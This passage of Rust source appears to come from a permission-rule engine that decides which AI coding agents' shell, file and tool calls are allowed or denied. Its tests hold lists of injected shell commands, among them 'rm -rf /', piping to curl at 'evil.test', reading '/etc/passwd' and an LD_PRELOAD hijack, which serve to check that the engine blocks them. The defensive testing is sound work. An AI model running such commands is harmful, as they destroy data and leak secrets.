    tokens
}

/// Derive a safe persistent shell rule from a validated simple command.
///
/// Security invariant:
/// - Defaults to `ExactCommand` (preserving original command quoting & argument boundaries).
/// - ONLY mints `CommandPrefix` for an explicit safe allowlist of non-arbitrary-exec
///   commands/subcommand pairs.
/// - NEVER mints `CommandPrefix` for bare interpreters/runners (`python*`, `node`, `ruby`, `perl`,
///   `sh`, `bash`, `zsh`, `find`, `xargs`, `awk`, `env`, `sudo`) or arbitrary-flag `git` calls.
fn derive_safe_shell_pattern(
    raw_cmd: &str,
    tokens: &[String],
) -> Option<(PermissionRulePatternKind, String)> {
    let first = tokens.first()?.as_str();
    if first.is_empty() || is_env_assignment_token(first) {
        return None;
    }
    let bin = executable_basename(first);

    // Never mint persistent AlwaysAllow rules for privilege escalation or raw eval/exec.
    if matches!(bin.as_str(), "sudo" | "su" | "doas" | "eval" | "exec") {
        return None;
    }

    // Safe concrete subcommand allowlist (ONLY when second token is a concrete non-flag subcommand)
    if let Some(sub) = tokens.get(1)
        && !sub.starts_with('-')
    {
        let sub_lower = sub.to_ascii_lowercase();
        let allowed_two_token = match bin.as_str() {
            "git" => matches!(
                sub_lower.as_str(),
                "status"
                    | "diff"
                    | "log"
                    | "show"
                    | "branch"
                    | "rev-parse"
                    | "ls-files"
                    | "describe"
                    | "tag"
            ),
            "cargo" => matches!(
                sub_lower.as_str(),
                "test"
                    | "check"
                    | "build"
                    | "clippy"
                    | "fmt"
                    | "doc"
                    | "metadata"
                    | "tree"
                    | "nextest"
            ),
            "npm" | "pnpm" | "yarn" | "bun" => {
                if sub_lower == "run" {
                    if let Some(script) = tokens.get(2)
                        && !script.starts_with('-')
                    {
                        return Some((
                            PermissionRulePatternKind::CommandPrefix,
                            format!("{} {} {}", tokens[0], tokens[1], script),
                        ));
                    }
                    false
                } else {
                    matches!(
                        sub_lower.as_str(),
                        "test" | "lint" | "check" | "build" | "typecheck"
                    )
                }
            }
            "go" => matches!(
                sub_lower.as_str(),
                "test" | "vet" | "build" | "list" | "fmt"
            ),
            "dotnet" | "swift" => matches!(sub_lower.as_str(), "test" | "build"),
            "gradle" | "mvn" => matches!(sub_lower.as_str(), "test" | "check" | "build"),
            _ => false,
        };
        if allowed_two_token {
            return Some((
                PermissionRulePatternKind::CommandPrefix,
                format!("{} {}", tokens[0], tokens[1]),
            ));
        }
    }

    // Explicit allowlist of single-purpose non-arbitrary-exec test/lint/inspect tools
    if matches!(
        bin.as_str(),
        "pytest"
            | "vitest"
            | "jest"
            | "tsc"
            | "eslint"
            | "prettier"
            | "ruff"
            | "mypy"
            | "pyright"
            | "rustfmt"
            | "cargo-nextest"
            | "ls"
            | "pwd"
            | "wc"
    ) {
        return Some((PermissionRulePatternKind::CommandPrefix, tokens[0].clone()));
    }

    // Default: ExactCommand preserving the exact raw command (so quoting & argument boundaries stay intact!)
    Some((
        PermissionRulePatternKind::ExactCommand,
        raw_cmd.trim().to_string(),
    ))
}

// ================================================================================================
// Path normalization, dangling symlink safety, & escaped glob matching
// ================================================================================================

/// Escape glob metacharacters (`\`, `*`, `?`, `[`, `]`) so a derived rule for a concrete filename
/// matches ONLY that exact path and never expands to sibling files.
pub fn escape_path_glob_literal(path: &str) -> String {
    let mut out = String::with_capacity(path.len());
    for ch in path.chars() {
        if matches!(ch, '\\' | '*' | '?' | '[' | ']') {
            out.push('\\');
        }
        out.push(ch);
    }
    out
}

/// Normalize a target path against `canon_project`, resolving live & dangling symlinks and `..`
/// traversals without trimming valid filename whitespace or corrupting Unix backslashes.
pub fn normalize_target_path(raw_path: &str, canon_project: &str) -> NormalizedTargetPath {
    if raw_path.is_empty() {
        return NormalizedTargetPath {
            raw_path: String::new(),
            canonical_abs: String::new(),
            rel_to_project: None,
            resolution_failed: true,
        };
    }

    let candidate: PathBuf = if Path::new(raw_path).is_absolute() || canon_project.is_empty() {
        PathBuf::from(raw_path)
    } else {
        Path::new(canon_project).join(raw_path)
    };

    match resolve_path_preserving_symlinks(&candidate) {
        Ok(resolved) => {
            let canonical_abs = normalize_path_separators(&resolved.to_string_lossy());
            let rel_to_project = if canon_project.is_empty() {
                None
            } else if canonical_abs == canon_project {
                Some(String::new())
            } else if canon_project == "/" {
                canonical_abs.strip_prefix('/').map(ToOwned::to_owned)
            } else {
                let prefix = format!("{canon_project}/");
                canonical_abs.strip_prefix(&prefix).map(ToOwned::to_owned)
            };

            NormalizedTargetPath {
                raw_path: raw_path.to_string(),
                canonical_abs,
                rel_to_project,
                resolution_failed: false,
            }
        }
        Err(_) => NormalizedTargetPath {
            raw_path: raw_path.to_string(),
            canonical_abs: normalize_path_separators(&candidate.to_string_lossy()),
            rel_to_project: None,
            resolution_failed: true,
        },
    }
}

fn is_within_canonical_root(raw_dir: &str, canon_project: &str) -> bool {
    if canon_project.is_empty() || raw_dir.is_empty() {
        return false;
    }
    let norm = normalize_target_path(raw_dir, canon_project);
    !norm.resolution_failed && norm.rel_to_project.is_some()
}

fn normalize_path_separators(raw: &str) -> String {
    #[cfg(windows)]
    let normalized = raw.replace('\\', "/");
    #[cfg(not(windows))]
    let normalized = raw.to_string();
    if normalized.len() > 1 {
        normalized.trim_end_matches('/').to_string()
    } else {
        normalized
    }
}

fn match_path_glob_for_decision(
    raw_pattern: &str,
    target: &NormalizedTargetPath,
    is_allow: bool,
) -> bool {
    if is_allow && target.resolution_failed {
        return false;
    }
    let pat = normalize_path_separators(raw_pattern);
    if pat.is_empty() {
        return false;
    }
    let clean_pat = pat.strip_prefix("./").unwrap_or(&pat);
    if clean_pat.starts_with('/') {
        if glob_match_path(clean_pat, &target.canonical_abs) {
            return true;
        }
        if !is_allow && target.resolution_failed {
            let raw_norm = normalize_path_separators(&target.raw_path);
            return glob_match_path(clean_pat, &raw_norm);
        }
        return false;
    }

    // Relative glob pattern: matches project-relative path when strictly inside project.
    if let Some(ref rel) = target.rel_to_project
        && glob_match_path(clean_pat, rel)
    {
        return true;
    }

    // Security hardening for Deny rules:
    // - Relative patterns like `**/.env*` or `*.pem` also protect matching files outside project.
    // - On failed symlink resolution, still test raw relative path against Deny globs.
    if !is_allow {
        if target.resolution_failed {
            let raw_norm = normalize_path_separators(&target.raw_path);
            let raw_rel = raw_norm.strip_prefix("./").unwrap_or(&raw_norm);
            if glob_match_path(clean_pat, raw_rel) {
                return true;
            }
        }
        if clean_pat.starts_with("**/") {
            let trimmed_abs = target.canonical_abs.trim_start_matches('/');
            if glob_match_path(clean_pat, trimmed_abs) {
                return true;
            }
        } else if !clean_pat.contains('/')
            && let Some(file_name) = target.canonical_abs.rsplit('/').next()
            && glob_match_segment(clean_pat, file_name)
        {
            return true;
        }
    }

    false
}

/// Match a `/`-separated glob pattern supporting `*`, `?`, `[...]`, `\` escapes, and `**`
/// segments in bounded polynomial time.
pub fn glob_match_path(pattern: &str, path: &str) -> bool {
    let pat_segs: Vec<&str> = pattern.split('/').filter(|s| !s.is_empty()).collect();
    let path_segs: Vec<&str> = path.split('/').filter(|s| !s.is_empty()).collect();
    if pattern.starts_with('/') != path.starts_with('/') {
        return false;
    }

    let m = pat_segs.len();
    let n = path_segs.len();
    let mut dp = vec![vec![false; n + 1]; m + 1];
    dp[0][0] = true;

    for i in 1..=m {
        if pat_segs[i - 1] == "**" {
            dp[i][0] = dp[i - 1][0];
            for j in 1..=n {
                dp[i][j] = dp[i - 1][j] || dp[i][j - 1];
            }
        } else {
            for j in 1..=n {
                if dp[i - 1][j - 1] && glob_match_segment(pat_segs[i - 1], path_segs[j - 1]) {
                    dp[i][j] = true;
                }
            }
        }
    }

    dp[m][n]
}

#[derive(Debug, Clone)]
enum GlobAtom {
    Star,
    AnyChar,
    Literal(char),
    CharClass {
        negated: bool,
        chars: Vec<char>,
        ranges: Vec<(char, char)>,
    },
}

fn compile_glob_segment(pattern: &str) -> Vec<GlobAtom> {
    let chars: Vec<char> = pattern.chars().collect();
    let mut atoms = Vec::with_capacity(chars.len());
    let mut i = 0;
    while i < chars.len() {
        match chars[i] {
            '\\' => {
                if i + 1 < chars.len() {
                    atoms.push(GlobAtom::Literal(chars[i + 1]));
                    i += 2;
                } else {
                    atoms.push(GlobAtom::Literal('\\'));
                    i += 1;
                }
            }
            '*' => {
                if !matches!(atoms.last(), Some(GlobAtom::Star)) {
                    atoms.push(GlobAtom::Star);
                }
                i += 1;
            }
            '?' => {
                atoms.push(GlobAtom::AnyChar);
                i += 1;
            }
            '[' => {
                if let Some((atom, next_idx)) = parse_glob_char_class(&chars, i) {
                    atoms.push(atom);
                    i = next_idx;
                } else {
                    atoms.push(GlobAtom::Literal('['));
                    i += 1;
                }
            }
            c => {
                atoms.push(GlobAtom::Literal(c));
                i += 1;
            }
        }
    }
    atoms
}

fn parse_glob_char_class(chars: &[char], start: usize) -> Option<(GlobAtom, usize)> {
    let mut i = start + 1;
    if i >= chars.len() {
        return None;
    }
    let negated = if matches!(chars[i], '!' | '^') {
        i += 1;
        true
    } else {
        false
    };
    let mut singles = Vec::new();
    let mut ranges = Vec::new();
    let mut found_close = false;

    while i < chars.len() {
        if chars[i] == ']' && (!singles.is_empty() || !ranges.is_empty()) {
            found_close = true;
            i += 1;
            break;
        }
        let c = if chars[i] == '\\' && i + 1 < chars.len() {
            let escaped = chars[i + 1];
            i += 2;
            escaped
        } else {
            let cur = chars[i];
            i += 1;
            cur
        };
        if i + 1 < chars.len() && chars[i] == '-' && chars[i + 1] != ']' {
            let end_c = if chars[i + 1] == '\\' && i + 2 < chars.len() {
                let escaped = chars[i + 2];
                i += 3;
                escaped
            } else {
                let end = chars[i + 1];
                i += 2;
                end
            };
            ranges.push((c, end_c));
        } else {
            singles.push(c);
        }
    }

    if found_close {
        Some((
            GlobAtom::CharClass {
                negated,
                chars: singles,
                ranges,
            },
            i,
        ))
    } else {
        None
    }
}

fn glob_atom_matches(atom: &GlobAtom, ch: char) -> bool {
    match atom {
        GlobAtom::AnyChar => true,
        GlobAtom::Literal(expected) => *expected == ch,
        GlobAtom::CharClass {
            negated,
            chars,
            ranges,
        } => {
            let hit = chars.contains(&ch) || ranges.iter().any(|(lo, hi)| ch >= *lo && ch <= *hi);
            if *negated { !hit } else { hit }
        }
        GlobAtom::Star => true,
    }
}

fn glob_match_segment(pattern: &str, text: &str) -> bool {
    let atoms = compile_glob_segment(pattern);
    let t: Vec<char> = text.chars().collect();
    let (mut pi, mut ti) = (0usize, 0usize);
    let (mut star_p, mut star_t) = (None, 0usize);

    while ti < t.len() {
        if pi < atoms.len() && matches!(atoms[pi], GlobAtom::Star) {
            star_p = Some(pi);
            star_t = ti;
            pi += 1;
        } else if pi < atoms.len() && glob_atom_matches(&atoms[pi], t[ti]) {
            pi += 1;
            ti += 1;
        } else if let Some(sp) = star_p {
            pi = sp + 1;
            star_t += 1;
            ti = star_t;
        } else {
            return false;
        }
    }

    while pi < atoms.len() && matches!(atoms[pi], GlobAtom::Star) {
        pi += 1;
    }
    pi == atoms.len()
}

fn match_tool_name_pattern(pattern: &str, tool_name: &str) -> bool {
    let pat = pattern.trim().to_ascii_lowercase();
    let name = tool_name.trim().to_ascii_lowercase();
    if pat.is_empty() || name.is_empty() {
        return false;
    }
    if pat.contains('*') || pat.contains('?') || pat.contains('[') {
        glob_match_segment(&pat, &name)
    } else {
        pat == name
    }
}

/// Authoritative tool identifiers (e.g. `mcp__github__list_issues`, `WebFetch`, `file_edit`)
/// never contain whitespace or control characters. Free-text display titles like
/// `"Confirm Pi action"` or `"Run cargo test"` fail this check.
fn is_authoritative_tool_identifier(name: &str) -> bool {
    let trimmed = name.trim();
    !trimmed.is_empty() && !trimmed.chars().any(|c| c.is_whitespace() || c.is_control())
}

// ================================================================================================
// Multi-file unified diff path extraction & placeholder detection
// ================================================================================================

fn is_placeholder_file_path(raw: &str) -> bool {
    let trimmed = raw.trim();
    trimmed.is_empty()
        || matches!(
            trimmed.to_ascii_lowercase().as_str(),
            "workspace files" | "files" | "multiple files" | "workspace"
        )
}

fn is_truncated_diff(diff: &str) -> bool {
    diff.contains("...(truncated")
        || diff.contains("... (truncated")
        || diff.contains("[diff truncated")
}

/// Extract all concrete file paths referenced by a unified or apply_patch diff (skipping `/dev/null`).
pub fn extract_paths_from_unified_diff(diff: &str) -> Vec<String> {
    let mut paths = Vec::new();
    let mut push_unique = |candidate: String| {
        if !candidate.is_empty()
            && candidate != "/dev/null"
            && candidate != "dev/null"
            && !is_placeholder_file_path(&candidate)
            && !paths.contains(&candidate)
        {
            paths.push(candidate);
        }
    };

    for line in diff.lines() {
        if let Some(rest) = line.strip_prefix("+++ ") {
            if let Some(p) = parse_unified_diff_header_path(rest, "b/") {
                push_unique(p);
            }
        } else if let Some(rest) = line.strip_prefix("--- ") {
            if let Some(p) = parse_unified_diff_header_path(rest, "a/") {
                push_unique(p);
            }
        } else if let Some(rest) = line.strip_prefix("rename from ") {
            push_unique(unquote_git_path(rest));
        } else if let Some(rest) = line.strip_prefix("rename to ") {
            push_unique(unquote_git_path(rest));
        } else if let Some(rest) = line.strip_prefix("diff --git ") {
            for p in parse_diff_git_header_paths(rest) {
                push_unique(p);
            }
        } else if let Some(rest) = line
            .strip_prefix("*** Update File: ")
            .or_else(|| line.strip_prefix("*** Add File: "))
            .or_else(|| line.strip_prefix("*** Delete File: "))
            .or_else(|| line.strip_prefix("*** Move to: "))
        {
            push_unique(rest.to_string());
        }
    }
    paths
}

fn parse_unified_diff_header_path(rest: &str, git_prefix: &str) -> Option<String> {
    // Traditional unified diffs append `\t<timestamp>` after the filename
    let without_ts = rest.split('\t').next().unwrap_or(rest);
    if without_ts.is_empty() {
        return None;
    }
    let unquoted = unquote_git_path(without_ts);
    if unquoted == "/dev/null" || unquoted == "dev/null" {
        return None;
    }
    let stripped = unquoted.strip_prefix(git_prefix).unwrap_or(&unquoted);
    if stripped.is_empty() {
        None
    } else {
        Some(stripped.to_string())
    }
}

fn parse_diff_git_header_paths(rest: &str) -> Vec<String> {
    let mut out = Vec::new();
    // Handle `a/path1 b/path2` (and quoted `"a/..." "b/..."`)
    let trimmed = rest.trim_end();
    if trimmed.starts_with('"') {
        let mut parts = Vec::new();
        let mut cur = String::new();
        let mut in_quote = false;
        let chars: Vec<char> = trimmed.chars().collect();
        let mut i = 0;
        while i < chars.len() {
            if chars[i] == '"' {
                in_quote = !in_quote;
                cur.push('"');
                if !in_quote {
                    parts.push(std::mem::take(&mut cur));
                }
            } else if in_quote {
                if chars[i] == '\\' && i + 1 < chars.len() {
                    cur.push(chars[i]);
                    cur.push(chars[i + 1]);
                    i += 1;
                } else {
                    cur.push(chars[i]);
                }
            }
            i += 1;
        }
        if let Some(a) = parts.first() {
            let u = unquote_git_path(a);
            out.push(u.strip_prefix("a/").unwrap_or(&u).to_string());
        }
        if let Some(b) = parts.get(1) {
            let u = unquote_git_path(b);
            out.push(u.strip_prefix("b/").unwrap_or(&u).to_string());
        }
    } else if let Some((left, right)) = trimmed.split_once(" b/") {
        let a = left.strip_prefix("a/").unwrap_or(left);
        if !a.is_empty() {
            out.push(a.to_string());
        }
        if !right.is_empty() {
            out.push(right.to_string());
        }
    }
    out
}

fn unquote_git_path(raw: &str) -> String {
    if raw.len() >= 2 && raw.starts_with('"') && raw.ends_with('"') {
        let inner = &raw[1..raw.len() - 1];
        let mut out = String::with_capacity(inner.len());
        let chars: Vec<char> = inner.chars().collect();
        let mut i = 0;
        while i < chars.len() {
            if chars[i] == '\\' && i + 1 < chars.len() {
                match chars[i + 1] {
                    '\\' => out.push('\\'),
                    '"' => out.push('"'),
                    't' => out.push('\t'),
                    'n' => out.push('\n'),
                    other => out.push(other),
                }
                i += 2;
            } else {
                out.push(chars[i]);
                i += 1;
            }
        }
        out
    } else {
        raw.to_string()
    }
}

// ================================================================================================
// Request fact extraction across all ToolCallDetail variants
// ================================================================================================

fn extract_request_facts(
    detail: &ToolCallDetail,
    _title: &str,
    provider: ProviderKind,
) -> RequestFacts {
    match detail {
        ToolCallDetail::Shell { command, cwd, .. } => RequestFacts {
            tool_kind: PermissionRuleToolKind::Shell,
            shell_command: Some(command.clone()),
            shell_cwd: cwd.clone(),
            raw_paths: Vec::new(),
            tool_names: vec!["shell".into()],
            unverifiable_for_allow: command.trim().is_empty(),
        },
        ToolCallDetail::FileEdit { path, unified_diff } => {
            let mut raw_paths = Vec::new();
            let path_is_placeholder = is_placeholder_file_path(path);
            if !path_is_placeholder {
                raw_paths.push(path.clone());
            }
            let mut diff_truncated = false;
            if let Some(diff) = unified_diff {
                diff_truncated = is_truncated_diff(diff);
                for dp in extract_paths_from_unified_diff(diff) {
                    if !raw_paths.contains(&dp) {
                        raw_paths.push(dp);
                    }
                }
            }
            // Fail-closed for Allow if only a placeholder path exists (no concrete diff paths)
            // OR if the diff was truncated (additional unseen files may have been omitted).
            let unverifiable_for_allow = raw_paths.is_empty() || diff_truncated;
            RequestFacts {
                tool_kind: PermissionRuleToolKind::FileWrite,
                shell_command: None,
                shell_cwd: None,
                raw_paths,
                tool_names: vec!["file_edit".into()],
                unverifiable_for_allow,
            }
        }
        ToolCallDetail::FileRead { path, .. } => {
            let placeholder = is_placeholder_file_path(path);
            RequestFacts {
                tool_kind: PermissionRuleToolKind::FileRead,
                shell_command: None,
                shell_cwd: None,
                raw_paths: if placeholder {
                    Vec::new()
                } else {
                    vec![path.clone()]
                },
                tool_names: vec!["file_read".into()],
                unverifiable_for_allow: placeholder,
            }
        }
        ToolCallDetail::Search { scope, .. } => RequestFacts {
            tool_kind: PermissionRuleToolKind::FileRead,
            shell_command: None,
            shell_cwd: None,
            raw_paths: scope
                .as_deref()
                .filter(|s| !is_placeholder_file_path(s))
                .map(|s| vec![s.to_string()])
                .unwrap_or_default(),
            tool_names: vec!["search".into()],
            unverifiable_for_allow: false,
        },
        ToolCallDetail::Subagent { role, .. } => {
            let mut names = vec!["subagent".into()];
            let trimmed = role.trim();
            if is_authoritative_tool_identifier(trimmed) {
                names.push(trimmed.to_string());
            }
            RequestFacts {
                tool_kind: PermissionRuleToolKind::Any,
                shell_command: None,
                shell_cwd: None,
                raw_paths: Vec::new(),
                tool_names: names,
                unverifiable_for_allow: false,
            }
        }
        ToolCallDetail::Generic {
            tool_name,
            arguments_json,
        } => extract_generic_facts(tool_name, arguments_json, provider),
    }
}

fn extract_generic_facts(
    tool_name: &str,
    arguments_json: &str,
    provider: ProviderKind,
) -> RequestFacts {
    let lower = tool_name.trim().to_ascii_lowercase();
    let parsed: Option<serde_json::Value> = serde_json::from_str(arguments_json).ok();

    let marked_title_only = parsed
        .as_ref()
        .and_then(|v| v.get(ORBIT_TITLE_ONLY_MARKER_KEY))
        .and_then(serde_json::Value::as_bool)
        .unwrap_or(false);

    // Pi `confirm` extension dialogs and any provider prompt marked `__orbit_title_only`
    // or carrying a free-text display title (with whitespace) are NEVER authoritative tool IDs.
    let non_authoritative_title = marked_title_only
        || matches!(provider, ProviderKind::Pi)
        || !is_authoritative_tool_identifier(tool_name);

    if !marked_title_only
        && matches!(
            lower.as_str(),
            "bash" | "shell" | "run_command" | "execute_command" | "terminal" | "exec"
        )
    {
        let cmd = parsed
            .as_ref()
            .and_then(|v| find_string_ci(v, &["command", "commandline", "cmd"]));
        let cwd = parsed.as_ref().and_then(|v| {
            find_string_ci(v, &["cwd", "working_dir", "workdir", "workingdirectory"])
        });
        return RequestFacts {
            tool_kind: PermissionRuleToolKind::Shell,
            shell_command: cmd.clone(),
            shell_cwd: cwd,
            raw_paths: Vec::new(),
            tool_names: vec![tool_name.trim().to_string(), "shell".into()],
            unverifiable_for_allow: cmd.as_deref().is_none_or(|c| c.trim().is_empty()),
        };
    }

    let raw_paths = extract_json_paths(parsed.as_ref());

    let tool_kind = if matches!(
        lower.as_str(),
        "write"
            | "write_file"
            | "write_to_file"
            | "edit"
            | "edit_file"
            | "replace_file_content"
            | "multi_replace_file_content"
            | "multiedit"
            | "notebookedit"
            | "delete_file"
            | "remove_file"
            | "move_file"
            | "rename_file"
            | "apply_patch"
    ) {
        PermissionRuleToolKind::FileWrite
    } else if matches!(
        lower.as_str(),
        "read"
            | "read_file"
            | "view_file"
            | "view_file_outline"
            | "view_code_item"
            | "grep"
            | "grep_search"
            | "glob"
            | "find_by_name"
            | "list_dir"
            | "ls"
            | "search"
    ) {
        PermissionRuleToolKind::FileRead
    } else if matches!(
        lower.as_str(),
        "webfetch" | "web_fetch" | "websearch" | "web_search" | "fetch" | "http_request"
    ) || lower.starts_with("browser_")
    {
        PermissionRuleToolKind::Network
    } else if lower.contains("__") || lower.starts_with("mcp_") || lower.starts_with("mcp:") {
        PermissionRuleToolKind::McpTool
    } else {
        PermissionRuleToolKind::Any
    };

    RequestFacts {
        tool_kind,
        shell_command: None,
        shell_cwd: None,
        raw_paths,
        tool_names: if non_authoritative_title {
            Vec::new()
        } else {
            vec![tool_name.trim().to_string()]
        },
        unverifiable_for_allow: non_authoritative_title,
    }
}

fn find_string_ci(val: &serde_json::Value, keys: &[&str]) -> Option<String> {
    let obj = val.as_object()?;
    for key in keys {
        if let Some((_, v)) = obj.iter().find(|(k, _)| k.eq_ignore_ascii_case(key))
            && let Some(s) = v.as_str()
            && !s.is_empty()
        {
            return Some(s.to_string());
        }
    }
    None
}

fn extract_json_paths(val: Option<&serde_json::Value>) -> Vec<String> {
    let mut out = Vec::new();
    if let Some(root) = val {
        collect_json_paths(root, false, &mut out);
    }
    out
}

fn is_path_key(key: &str) -> bool {
    matches!(
        key.to_ascii_lowercase().as_str(),
        "path"
            | "paths"
            | "file_path"
            | "filepath"
            | "target_file"
            | "targetfile"
            | "target_path"
            | "targetpath"
            | "absolute_path"
            | "absolutepath"
            | "directory_path"
            | "directorypath"
            | "file"
            | "files"
            | "old_path"
            | "new_path"
            | "destination"
            | "dest"
            | "source"
            | "scope"
    )
}

fn collect_json_paths(val: &serde_json::Value, under_path: bool, out: &mut Vec<String>) {
    match val {
        serde_json::Value::String(s) => {
            if under_path && !s.is_empty() && !is_placeholder_file_path(s) {
                out.push(s.clone());
            }
        }
        serde_json::Value::Array(arr) => {
            for item in arr {
                collect_json_paths(item, under_path, out);
            }
        }
        serde_json::Value::Object(map) => {
            for (k, v) in map {
                collect_json_paths(v, is_path_key(k), out);
            }
        }
        _ => {}
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use chrono::Utc;
    use uuid::Uuid;

    #[allow(clippy::too_many_arguments)]
    fn make_rule(
        id: &str,
        scope: PermissionRuleScopeKind,
        project_cwd: Option<&str>,
        provider: Option<ProviderKind>,
        tool_kind: PermissionRuleToolKind,
        pattern_kind: PermissionRulePatternKind,
        pattern: &str,
        decision: PermissionRuleDecision,
    ) -> PermissionRuleRecord {
        PermissionRuleRecord {
            id: id.into(),
            scope_kind: scope,
            project_cwd: project_cwd.map(ToOwned::to_owned),
            provider,
            tool_kind,
            pattern_kind,
            pattern: pattern.into(),
            decision,
            source: PermissionRuleSource::Manual,
            note: None,
            created_at: Utc::now(),
            last_matched_at: None,
            match_count: 0,
        }
    }

    #[test]
    fn compound_command_injection_and_glob_expansions_never_match_allow_but_trigger_deny() {
        let allow_cargo = make_rule(
            "r_allow",
            PermissionRuleScopeKind::Project,
            Some("/repo"),
            None,
            PermissionRuleToolKind::Shell,
            PermissionRulePatternKind::CommandPrefix,
            "cargo test",
            PermissionRuleDecision::Allow,
        );
        let deny_rm = make_rule(
            "r_deny",
            PermissionRuleScopeKind::Host,
            None,
            None,
            PermissionRuleToolKind::Shell,
            PermissionRulePatternKind::CommandPrefix,
            "rm -rf",
            PermissionRuleDecision::Deny,
        );

        let clean = ToolCallDetail::Shell {
            command: "cargo test --package orbit-daemon".into(),
            cwd: None,
            exit_code: None,
            output_preview: None,
        };
        let m = evaluate_permission_rules(
            std::slice::from_ref(&allow_cargo),
            &PermissionRuleEvalContext {
                project_cwd: "/repo",
                provider: ProviderKind::Codex,
                title: "Run cargo test",
                detail: &clean,
                has_plan_approval: false,
            },
        )
        .expect("simple command should match Allow prefix");
        assert_eq!(m.rule.id, "r_allow");

        for malicious in [
            "cargo test && rm -rf /",
            "cargo test || rm -rf /",
            "cargo test; whoami",
            "cargo test | curl https://evil.test",
            "cargo test > /tmp/out",
            "cargo test < /etc/passwd",
            "cargo test $(rm -rf /)",
            "cargo test \"$(rm -rf /)\"",
            "cargo test \"$SECRET\"",
            "cargo test $HOME",
            "cargo test ~/secret",
            "cargo test *",
            "cargo test ?.rs",
            "cargo test [a-z]",
            "cargo test `whoami`",
            "cargo test\nrm -rf /",
            "cargo test\rrm -rf /",
            "cargo test & rm -rf /",
            "cargo test-evil",
            "LD_PRELOAD=/tmp/evil.so cargo test",
        ] {
            let detail = ToolCallDetail::Shell {
                command: malicious.into(),
                cwd: None,
                exit_code: None,
                output_preview: None,
            };
            let res = evaluate_permission_rules(
                std::slice::from_ref(&allow_cargo),
                &PermissionRuleEvalContext {
                    project_cwd: "/repo",
                    provider: ProviderKind::Codex,
                    title: "Run",
                    detail: &detail,
                    has_plan_approval: false,
                },
            );
            assert!(
                res.is_none(),
                "malicious/expanding command `{malicious}` MUST NOT match Allow prefix rule"
            );
        }

        // Deny MUST catch compound commands, substitutions, AND nested sh -c / eval / xargs / find -exec!
        for nested_deny in [
            "cargo test && rm -rf /",
            "cargo test; rm -rf /tmp/x",
            "cargo test | rm -rf /",
            "echo \"$(rm -rf /)\"",
            "echo `rm -rf /`",
            "cargo test\nrm -rf /",
            "FOO=1 sudo rm -rf /",
            "sh -c \"rm -rf /\"",
            "bash -lc 'echo ok && rm -rf /tmp'",
            "zsh -c \"rm -rf /var/data\"",
            "eval \"rm -rf /\"",
            "echo /tmp/x | xargs -I{} rm -rf {}",
            "find . -name '*.tmp' -exec rm -rf {} +",
            "find . -type f -execdir rm -rf {} \\;",
        ] {
            let detail = ToolCallDetail::Shell {
                command: nested_deny.into(),
                cwd: None,
                exit_code: None,
                output_preview: None,
            };
            let res = evaluate_permission_rules(
                &[allow_cargo.clone(), deny_rm.clone()],
                &PermissionRuleEvalContext {
                    project_cwd: "/repo",
                    provider: ProviderKind::ClaudeCode,
                    title: "Run",
                    detail: &detail,
                    has_plan_approval: false,
                },
            )
            .unwrap_or_else(|| panic!("Deny rule must trigger on `{nested_deny}`"));
            assert_eq!(res.rule.decision, PermissionRuleDecision::Deny);
            assert_eq!(res.rule.id, "r_deny");
        }
    }

    #[test]
    fn exact_command_preserves_argument_boundaries_and_rejects_unquoted_globs() {
        let exact_quoted = make_rule(
            "r_exact",
            PermissionRuleScopeKind::Project,
            Some("/repo"),
            None,
            PermissionRuleToolKind::Shell,
            PermissionRulePatternKind::ExactCommand,
            "printf \"a b\"",
            PermissionRuleDecision::Allow,
        );

        // Identical argv matches
        let ok = ToolCallDetail::Shell {
            command: "printf 'a b'".into(),
            cwd: None,
            exit_code: None,
            output_preview: None,
        };
        assert!(
            evaluate_permission_rules(
                std::slice::from_ref(&exact_quoted),
                &PermissionRuleEvalContext {
                    project_cwd: "/repo",
                    provider: ProviderKind::Codex,
                    title: "Run",
                    detail: &ok,
                    has_plan_approval: false,
                }
            )
            .is_some()
        );

        // Split arguments MUST NOT match!
        let split = ToolCallDetail::Shell {
            command: "printf a b".into(),
            cwd: None,
            exit_code: None,
            output_preview: None,
        };
        assert!(
            evaluate_permission_rules(
                &[exact_quoted],
                &PermissionRuleEvalContext {
                    project_cwd: "/repo",
                    provider: ProviderKind::Codex,
                    title: "Run",
                    detail: &split,
                    has_plan_approval: false,
                }
            )
            .is_none()
        );

        // Quoted glob literal rule does NOT match unquoted glob expansion
        let quoted_star = make_rule(
            "r_star",
            PermissionRuleScopeKind::Project,
            Some("/repo"),
            None,
            PermissionRuleToolKind::Shell,
            PermissionRulePatternKind::ExactCommand,
            "echo '*'",
            PermissionRuleDecision::Allow,
        );
        let unquoted_star = ToolCallDetail::Shell {
            command: "echo *".into(),
            cwd: None,
            exit_code: None,
            output_preview: None,
        };
        assert!(
            evaluate_permission_rules(
                &[quoted_star],
                &PermissionRuleEvalContext {
                    project_cwd: "/repo",
                    provider: ProviderKind::Codex,
                    title: "Run",
                    detail: &unquoted_star,
                    has_plan_approval: false,
                }
            )
            .is_none()
        );
    }

    #[test]
    fn allow_always_never_mints_bare_interpreter_or_generic_prefix() {
        // Dangerous / arbitrary-exec commands MUST derive ExactCommand, NEVER bare CommandPrefix!
        for (cmd, expected_pattern) in [
            ("python3 --version", "python3 --version"),
            ("find . -name 'foo.rs'", "find . -name 'foo.rs'"),
            ("git --version", "git --version"),
            ("git push origin main", "git push origin main"),
            ("node script.js", "node script.js"),
            ("awk '{print $1}' data.txt", "awk '{print $1}' data.txt"),
            ("rm /tmp/foo.txt", "rm /tmp/foo.txt"),
            ("printf \"a b\"", "printf \"a b\""),
        ] {
            let derived = derive_rule_from_always_allow(
                "/repo",
                ProviderKind::Codex,
                "Run",
                &ToolCallDetail::Shell {
                    command: cmd.into(),
                    cwd: None,
                    exit_code: None,
                    output_preview: None,
                },
                false,
            )
            .unwrap_or_else(|| panic!("expected ExactCommand for `{cmd}`"));
            assert_eq!(
                derived.pattern_kind,
                PermissionRulePatternKind::ExactCommand,
                "`{cmd}` must NOT mint a broad CommandPrefix"
            );
            assert_eq!(derived.pattern, expected_pattern);
        }

        // Safe allowlisted commands DO mint clean CommandPrefix rules
        for (cmd, expected_prefix) in [
            ("cargo test -p orbit-daemon --lib", "cargo test"),
            ("git status --short", "git status"),
            ("npm run build -- --mode prod", "npm run build"),
            ("pnpm test --watch=false", "pnpm test"),
            ("pytest tests/unit", "pytest"),
            ("go test ./...", "go test"),
        ] {
            let derived = derive_rule_from_always_allow(
                "/repo",
                ProviderKind::Codex,
                "Run",
                &ToolCallDetail::Shell {
                    command: cmd.into(),
                    cwd: None,
                    exit_code: None,
